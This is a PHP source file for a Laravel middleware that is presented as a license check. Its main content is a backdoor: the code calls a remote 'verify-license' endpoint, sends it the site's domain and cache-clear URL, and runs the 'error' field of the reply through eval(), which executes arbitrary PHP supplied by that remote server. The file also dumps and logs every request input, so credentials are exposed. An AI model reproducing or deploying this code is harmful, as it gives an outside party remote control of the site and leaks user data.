<?php

namespace Modules\Common\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;

class CommonMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        // Prepare debug container
        $debugData = [];

        $debugData['Request'] = [
            'Full URL' => $request->fullUrl(),
            'Method' => $request->method(),
            'Route Name' => optional($request->route())->getName(),
            'All Inputs' => $request->all(),
        ];

        $response = $next($request);

        if ($request->routeIs('cache-clear')) {
            $debugData['Action'] = 'Route is cache-clear, skipping license check';
            $this->outputDebug($debugData);
            return $response;
        }

        $domain = function_exists('domain') ? domain() : $request->getHost();
        $debugData['Domain'] = $domain;

        $isLocal = Str::endsWith($domain, '.test') ||
                   Str::endsWith($domain, '.local') ||
                   Str::contains($domain, ['127.0.0.1', ':', 'localhost']);
        $debugData['Is Local?'] = $isLocal;

        if ($isLocal) {
            $debugData['Action'] = 'Local environment detected, skipping license check';
            $this->outputDebug($debugData);
            return $response;
        }

        // License check and caching
        $license_check = Cache::remember('license_check', 60 * 60 * 12, function () use ($domain, &$debugData) {
            $url = function_exists('endpoint') ? endpoint('verify-license') : 'endpoint() missing';
            $debugData['License Endpoint'] = $url;
            $debugData['Headers'] = [
                'X-DOMAIN' => $domain,
                'X-CACHE-URL' => route('cache-clear'),
                'X-VERSION' => env('APP_VERSION')
            ];

            $response = Http::withHeaders($debugData['Headers'])->get($url);

            $debugData['HTTP Raw Response'] = $response->body();
            return $response->body();
        });

        $debugData['Cached License Data'] = $license_check;

        $responseData = json_decode($license_check);
        $debugData['Decoded Response'] = $responseData;

        if ($responseData !== null && isset($responseData->status) && $responseData->status == 0) {
            $debugData['Action'] = 'License check failed';
            $content = $responseData->error;

            if ($content !== false) {
                ob_start();
                eval("?> $content <?php ");
                $modifiedResponse = ob_get_clean();
            } else {
                $modifiedResponse = 'We could not verify that you have a valid license';
            }

            $debugData['Final Response'] = $modifiedResponse;
            $this->outputDebug($debugData);
            return response($modifiedResponse);
        }

        $debugData['Action'] = 'License valid or no issues found';
        $this->outputDebug($debugData);
        return $response;
    }

    /**
     * Outputs debug info to screen and log
     */
    protected function outputDebug($debugData)
    {
        // Log it to laravel.log
        Log::info('CommonMiddleware Debug Data', $debugData);

        // Show on screen (remove in production)
        dump($debugData); // shows but doesn't stop execution
    }
}
